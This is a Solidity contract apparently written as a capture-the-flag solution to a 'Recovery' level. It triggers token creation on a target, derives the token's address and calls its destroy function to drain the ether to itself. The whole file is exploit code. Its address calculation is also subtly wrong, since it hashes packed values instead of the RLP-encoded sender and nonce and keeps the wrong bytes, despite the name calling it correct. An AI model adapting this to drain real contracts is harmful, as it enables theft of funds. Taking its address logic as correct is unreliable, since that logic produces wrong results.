pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryExploitCorrect {
    address public recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function calculateTokenAddress() public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, uint256(1)));
        return address(uint160(bytes20(hash)));
    }

    function callGenerateTokenAndDestroy() public {
        recoveryInstance.call(abi.encodeWithSignature('generateToken(string,uint256)', 'MyToken', 100000));
        ISimpleToken token = ISimpleToken(calculateTokenAddress());
        token.destroy(payable(address(this)));
    }

    receive() external payable {} }
